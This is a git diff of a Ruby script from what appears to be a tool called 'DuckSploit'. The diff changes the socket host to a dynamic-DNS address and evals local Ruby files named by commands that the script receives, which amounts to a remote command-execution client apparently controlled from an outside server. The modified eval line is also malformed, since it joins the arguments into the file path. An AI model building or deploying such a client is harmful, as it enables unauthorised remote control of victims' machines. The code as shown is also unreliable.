@@ -2,8 +2,8 @@ require "socket"
 require "colorize"
 
 
-# host = "duckpvp1.ddns.net"
-host = "0.0.0.0"
+host = "duckpvp1.ddns.net"
+# host = "0.0.0.0"
 port = 8015
 
 loop do
@@ -19,7 +19,8 @@ loop do
 		else
 			filepath = "C:/DuckSploit/ruby/#{downcasecmd}.rb".chomp
 			if File.exist?(filepath)
-				eval File.read("C:/DuckSploit/ruby/#{downcasecmd}.rb")				
+			    # system("ruby C:/DuckSploit/ruby/#{downcasecmd}.rb #{cmd.sub(downcasecmd, "")}")
+				eval File.read("C:/DuckSploit/ruby/#{downcasecmd}.rb, #{cmd.sub(downcasecmd, "")}")
 			else
 				out = "[".red.bold.blink + "x".white.bold.blink + "] Command (".red.bold.blink + "#{downcasecmd}".yellow.blink + ") does not exist!\n\n".red.bold.blink
 			end
